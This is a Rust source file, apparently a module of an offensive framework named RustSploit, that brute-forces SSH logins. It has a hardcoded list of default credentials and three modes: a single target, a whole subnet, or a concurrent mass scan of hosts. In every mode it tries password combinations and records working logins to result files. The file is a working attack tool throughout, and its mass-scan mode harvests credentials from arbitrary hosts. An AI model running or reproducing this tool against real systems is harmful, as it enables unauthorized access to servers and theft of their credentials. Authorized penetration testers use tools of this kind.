use anyhow::{anyhow, Result};
use colored::*;
use ssh2::Session;
use std::{
    io::Write,
    net::{IpAddr, TcpStream, ToSocketAddrs},
    time::Duration,
};
use tokio::{
    task::spawn_blocking,
    time::timeout,
};

use crate::utils::{
    normalize_target,
    load_lines, get_filename_in_current_dir,
    cfg_prompt_default, cfg_prompt_yes_no, cfg_prompt_existing_file, cfg_prompt_port,
    cfg_prompt_output_file,
};
use crate::modules::creds::utils::{
    BruteforceConfig, LoginResult, SubnetScanConfig,
    generate_combos, run_bruteforce, run_subnet_bruteforce,
    is_subnet_target, is_mass_scan_target, run_mass_scan, MassScanConfig,
};

// Constants
const DEFAULT_SSH_PORT: u16 = 22;
const DEFAULT_CREDENTIALS: &[(&str, &str)] = &[
    ("root", "root"),
    ("admin", "admin"),
    ("user", "user"),
    ("guest", "guest"),
    ("root", "123456"),
    ("admin", "123456"),
    ("root", "password"),
    ("admin", "password"),
    ("root", ""),
    ("admin", ""),
    ("ubuntu", "ubuntu"),
    ("test", "test"),
    ("oracle", "oracle"),
];


pub fn info() -> crate::module_info::ModuleInfo {
    crate::module_info::ModuleInfo {
        name: "SSH Brute Force".to_string(),
        description: "Brute-force SSH authentication using username/password wordlists. Supports default credential testing, combo mode, concurrent connections, and subnet/mass scanning.".to_string(),
        authors: vec!["RustSploit Contributors".to_string()],
        references: vec![],
        disclosure_date: None,
        rank: crate::module_info::ModuleRank::Normal,
    }
}

pub async fn run(target: &str) -> Result<()> {
    crate::mprintln!("{}", "=== SSH Brute Force Module ===".bold());
    crate::mprintln!("[*] Target: {}", target);

    // --- Mass Scan Mode ---
    if is_mass_scan_target(target) {
        crate::mprintln!("{}", format!("[*] Target: {} — Mass Scan Mode", target).yellow());
        return run_mass_scan(target, MassScanConfig {
            protocol_name: "SSH",
            default_port: 22,
            state_file: "ssh_hose_state.log",
            default_output: "ssh_mass_results.txt",
            default_concurrency: 200,
        }, move |ip, port| {
            async move {
                if !crate::utils::tcp_port_open(ip, port, std::time::Duration::from_secs(5)).await {
                    return None;
                }
                let addr = format!("{}:{}", ip, port);
                let tcp = match crate::utils::blocking_tcp_connect(
                    &addr.parse().ok()?, std::time::Duration::from_secs(5)
                ) {
                    Ok(t) => t,
                    Err(_) => return None,
                };
                let mut sess = ssh2::Session::new().ok()?;
                sess.set_tcp_stream(tcp);
                sess.set_timeout(10000);
                if sess.handshake().is_err() { return None; }
                // Try common defaults
                let creds = [("root","root"),("admin","admin"),("root",""),("admin",""),("root","123456"),("admin","password")];
                for (user, pass) in creds {
                    if sess.userauth_password(user, pass).is_ok() {
                        let ts = chrono::Local::now().format("%Y-%m-%d %H:%M:%S");
                        return Some(format!("[{}] {}:{}:{}:{}\n", ts, ip, port, user, pass));
                    }
                }
                None
            }
        }).await;
    }

    // --- Subnet Scan Mode ---
    if is_subnet_target(target) {
        let port: u16 = cfg_prompt_port("port", "SSH Port", DEFAULT_SSH_PORT).await?;

        let usernames_file = cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?;
        let passwords_file = cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?;
        let users = load_lines(&usernames_file)?;
        let passes = load_lines(&passwords_file)?;
        if users.is_empty() { return Err(anyhow!("User list empty")); }
        if passes.is_empty() { return Err(anyhow!("Pass list empty")); }

        let concurrency: usize = {
            let input = cfg_prompt_default("concurrency", "Max concurrent hosts", "10").await?;
            input.parse::<usize>().unwrap_or(10).max(1).min(256)
        };
        let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
        let output_file = cfg_prompt_output_file("output_file", "Output result file", "ssh_subnet_results.txt").await?;

        let connection_timeout: u64 = {
            let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "5").await?;
            input.parse::<u64>().unwrap_or(5).max(1).min(60)
        };
        let timeout_duration = Duration::from_secs(connection_timeout);

        return run_subnet_bruteforce(target, port, users, passes, &SubnetScanConfig {
            concurrency,
            verbose,
            output_file,
            service_name: "ssh",
            source_module: "creds/generic/ssh_bruteforce",
            skip_tcp_check: false,
        }, move |ip: IpAddr, port: u16, user: String, pass: String| {
            let timeout_dur = timeout_duration;
            async move {
                let addr = format!("{}:{}", ip, port);
                match try_ssh_login(&addr, &user, &pass, timeout_dur).await {
                    Ok(true) => LoginResult::Success,
                    Ok(false) => LoginResult::AuthFailed,
                    Err(e) => LoginResult::Error { message: e.to_string(), retryable: true },
                }
            }
        }).await;
    }

    // --- Single Target Mode ---
    let port: u16 = cfg_prompt_port("port", "SSH Port", DEFAULT_SSH_PORT).await?;

    // Ask about default credentials
    let use_defaults = cfg_prompt_yes_no("use_defaults", "Try default credentials first?", true).await?;

    let usernames_file = if cfg_prompt_yes_no("use_username_wordlist", "Use username wordlist?", true).await? {
        Some(cfg_prompt_existing_file("username_wordlist", "Username wordlist").await?)
    } else {
        None
    };

    let passwords_file = if cfg_prompt_yes_no("use_password_wordlist", "Use password wordlist?", true).await? {
        Some(cfg_prompt_existing_file("password_wordlist", "Password wordlist").await?)
    } else {
        None
    };

    if !use_defaults && usernames_file.is_none() && passwords_file.is_none() {
        return Err(anyhow!("At least one wordlist or default credentials must be enabled"));
    }

    let concurrency: usize = {
        let input = cfg_prompt_default("concurrency", "Max concurrent tasks", "10").await?;
        input.parse::<usize>().unwrap_or(10).max(1).min(256)
    };

    let connection_timeout: u64 = {
        let input = cfg_prompt_default("timeout", "Connection timeout (seconds)", "5").await?;
        input.parse::<u64>().unwrap_or(5).max(1).min(60)
    };

    let retry_on_error = cfg_prompt_yes_no("retry_on_error", "Retry on connection errors?", true).await?;
    let max_retries: usize = if retry_on_error {
        let input = cfg_prompt_default("max_retries", "Max retries per attempt", "2").await?;
        input.parse::<usize>().unwrap_or(2).max(1).min(10)
    } else {
        0
    };

    let stop_on_success = cfg_prompt_yes_no("stop_on_success", "Stop on first success?", true).await?;
    let save_results = cfg_prompt_yes_no("save_results", "Save results to file?", true).await?;
    let save_path = if save_results {
        Some(cfg_prompt_output_file("output_file", "Output file", "ssh_brute_results.txt").await?)
    } else {
        None
    };
    let verbose = cfg_prompt_yes_no("verbose", "Verbose mode?", false).await?;
    let combo_mode = cfg_prompt_yes_no("combo_mode", "Combination mode? (try every pass with every user)", false).await?;

    let connect_addr = normalize_target(&format!("{}:{}", target, port)).unwrap_or_else(|_| format!("{}:{}", target, port));

    crate::mprintln!("\n{}", format!("[*] Starting brute-force on {}", connect_addr).cyan());

    // Load wordlists
    let mut usernames = Vec::new();
    if let Some(ref file) = usernames_file {
        usernames = load_lines(file)?;
        if usernames.is_empty() {
            crate::mprintln!("{}", "[!] Username wordlist is empty.".yellow());
        } else {
            crate::mprintln!("{}", format!("[*] Loaded {} usernames", usernames.len()).green());
        }
    }

    let mut passwords = Vec::new();
    if let Some(ref file) = passwords_file {
        passwords = load_lines(file)?;
        if passwords.is_empty() {
            crate::mprintln!("{}", "[!] Password wordlist is empty.".yellow());
        } else {
            crate::mprintln!("{}", format!("[*] Loaded {} passwords", passwords.len()).green());
        }
    }

    // Add default credentials if requested
    if use_defaults {
        for (user, pass) in DEFAULT_CREDENTIALS {
            if !usernames.contains(&user.to_string()) {
                usernames.push(user.to_string());
            }
            if !passwords.contains(&pass.to_string()) {
                passwords.push(pass.to_string());
            }
        }
        crate::mprintln!("{}", format!("[*] Added {} default credentials", DEFAULT_CREDENTIALS.len()).green());
    }

    if usernames.is_empty() {
        return Err(anyhow!("No usernames available"));
    }
    if passwords.is_empty() {
        return Err(anyhow!("No passwords available"));
    }

    let combos = generate_combos(&usernames, &passwords, combo_mode);
    let timeout_duration = Duration::from_secs(connection_timeout);

    let try_login = move |t: String, p: u16, user: String, pass: String| {
        let timeout_dur = timeout_duration;
        async move {
            let addr = normalize_target(&format!("{}:{}", t, p))
                .unwrap_or_else(|_| format!("{}:{}", t, p));
            match try_ssh_login(&addr, &user, &pass, timeout_dur).await {
                Ok(true) => LoginResult::Success,
                Ok(false) => LoginResult::AuthFailed,
                Err(e) => LoginResult::Error { message: e.to_string(), retryable: true },
            }
        }
    };

    let result = run_bruteforce(&BruteforceConfig {
        target: target.to_string(),
        port,
        concurrency,
        stop_on_success,
        verbose,
        delay_ms: 0,
        max_retries,
        service_name: "ssh",
        source_module: "creds/generic/ssh_bruteforce",
    }, combos, try_login).await?;

    result.print_found();
    if let Some(ref path) = save_path {
        result.save_to_file(path)?;
    }

    // Unknown / errored attempts
    if !result.errors.is_empty() {
        crate::mprintln!(
            "{}",
            format!(
                "[?] Collected {} unknown/errored SSH responses.",
                result.errors.len()
            )
            .yellow()
            .bold()
        );
        if cfg_prompt_yes_no("save_unknown_responses", "Save unknown responses to file?", true).await? {
            let default_name = "ssh_unknown_responses.txt";
            let fname = cfg_prompt_output_file(
                "unknown_responses_file",
                "What should the unknown results be saved as?",
                default_name,
            ).await?;
            let filename = get_filename_in_current_dir(&fname);
            use std::os::unix::fs::OpenOptionsExt;
            let mut opts = std::fs::OpenOptions::new();
            opts.write(true).create(true).truncate(true);
            opts.mode(0o600);
            match opts.open(&filename) {
                Ok(mut file) => {
                    writeln!(
                        file,
                        "# SSH Bruteforce Unknown/Errored Responses (host,user,pass,error)"
                    )?;
                    for (host, user, pass, msg) in &result.errors {
                        writeln!(file, "{} -> {}:{} - {}", host, user, pass, msg)?;
                    }
                    file.flush()?;
                    crate::mprintln!(
                        "{}",
                        format!("[+] Unknown responses saved to '{}'", filename.display()).green()
                    );
                }
                Err(e) => {
                    crate::mprintln!(
                        "{}",
                        format!(
                            "[!] Could not create unknown response file '{}': {}",
                            filename.display(),
                            e
                        )
                        .red()
                    );
                }
            }
        }
    }

    Ok(())
}

async fn try_ssh_login(
    normalized_addr: &str,
    user: &str,
    pass: &str,
    timeout_duration: Duration,
) -> Result<bool> {
    let user_owned = user.to_string();
    let pass_owned = pass.to_string();
    let addr_owned = normalized_addr.to_string();

    let handle = spawn_blocking(move || {
            let socket_addr: std::net::SocketAddr = addr_owned.parse()
                .or_else(|_| addr_owned.to_socket_addrs().and_then(|mut a|
                    a.next().ok_or_else(|| std::io::Error::new(std::io::ErrorKind::NotFound, "No addresses resolved"))))
                .map_err(|e| anyhow!("Cannot resolve address {}: {}", addr_owned, e))?;
            let tcp = TcpStream::connect_timeout(&socket_addr, timeout_duration)
                .map_err(|e| anyhow!("Connection error: {}", e))?;

            let mut sess = Session::new()
                .map_err(|e| anyhow!("Failed to create SSH session: {}", e))?;
            sess.set_tcp_stream(tcp);

            sess.handshake()
                .map_err(|e| anyhow!("SSH handshake failed: {}", e))?;

            sess.userauth_password(&user_owned, &pass_owned)
                .map_err(|e| anyhow!("Authentication failed: {}", e))?;

            Ok(sess.authenticated())
    });

    let join_result = timeout(timeout_duration, handle)
        .await
        .map_err(|_| anyhow!("Connection timeout"))?;

    join_result.map_err(|e| anyhow!("Join error: {}", e))?
}
